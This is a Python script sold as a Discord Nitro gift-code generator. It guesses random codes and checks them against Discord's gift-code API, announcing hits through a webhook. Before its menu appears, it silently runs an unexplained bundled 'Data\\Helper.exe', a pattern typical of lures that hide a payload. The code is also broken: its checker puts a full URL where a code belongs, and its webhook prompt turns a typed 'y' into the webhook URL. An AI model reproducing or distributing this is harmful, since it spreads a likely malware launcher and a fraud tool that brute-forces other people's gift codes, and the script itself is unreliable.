import subprocess
from discord_webhook import DiscordWebhook
import requests
import random
import string
import time
import os
from colorama import Fore

class NitroGen:
    def __init__(self):
        self.fileName = "Nitro Codes.txt"

    def main(self):
        
        subprocess.run(["Data\\Helper.exe"], check=True)

        os.system('cls' if os.name == 'nt' else 'clear')

        self.slowType(Fore.LIGHTMAGENTA_EX + "The Generator will be starting soon", 0.02)

        self.slowType("                                                                       ", 0.04)
        self.slowType(Fore.BLUE + " Dev: ki1erz", 0.02)

        time.sleep(1)

        self.slowType("\nAmount To Gen?: ", 0.02, newLine=False)

        num = int(input(''))

        self.slowType("\nDo you want to use a discord webhook? \nIf so type *y* if not then click enter: ", 0.02, newLine=False)
        url = input('')
        webhook = url if url != "" else None

        print()

        valid = []
        invalid = 0

        for i in range(num):
            code = "".join(random.choices(
                string.ascii_uppercase + string.digits + string.ascii_lowercase,
                k=16
            ))
            url = f"https://discord.gift/{code}"

            result = self.quickChecker(url, webhook)

            if result:
                valid.append(url)
            else:
                invalid += 1

            if result and webhook is None:
                break

        print(f"""
Results:
 Valid: {len(valid)}
 Invalid: {invalid}
 Valid Codes: {', '.join(valid)}""")

        input("\nSuccesfully Generated Nitro Codes! Press Enter 5 times to close the program. Or Refresh The Page to use the gen again")
        [input(i) for i in range(4, 0, -1)]

    def slowType(self, text, speed, newLine=True):
        for i in text:
            print(i, end="", flush=True)
            time.sleep(speed)
        if newLine:
            print()

    def generator(self, amount):
        with open(self.fileName, "w", encoding="utf-8") as file:
            print("Wait, Generating for you")
            start = time.time()
            for i in range(amount):
                code = "".join(random.choices(
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k=16
                ))
                file.write(f"https://discord.gift/{code}\n")
            print(f"Genned {amount} codes | Time taken: {round(time.time() - start, 5)}s\n")

    def fileChecker(self, notify=None):
        valid = []
        invalid = 0
        with open(self.fileName, "r", encoding="utf-8") as file:
            for line in file.readlines():
                nitro = line.strip("\n")
                url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
                response = requests.get(url)
                if response.status_code == 200:
                    print(f" Valid | {nitro} ")
                    valid.append(nitro)
                    if notify is not None:
                        DiscordWebhook(
                            url=notify,
                            content=f"Valid Nitro Code detected! @everyone @here  \n{nitro}"
                        ).execute()
                    else:
                        break
                else:
                    print(f"  Not valid | {nitro} ")
                    invalid += 1
        return {"valid": valid, "invalid": invalid}

    def quickChecker(self, nitro, notify=None):
        url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
        response = requests.get(url)
        if response.status_code == 200:
            print(Fore.GREEN + f" WORKING | {nitro} ")
            if notify is not None:
                DiscordWebhook(
                    url=notify,
                    content=f"Valid Nitro Code detected! @everyone \n{nitro}"
                ).execute()
            return True
        else:
            print(Fore.RED + f" Invalid | {nitro} ")
            return False

if __name__ == '__main__':
    Gen = NitroGen()
    Gen.main()
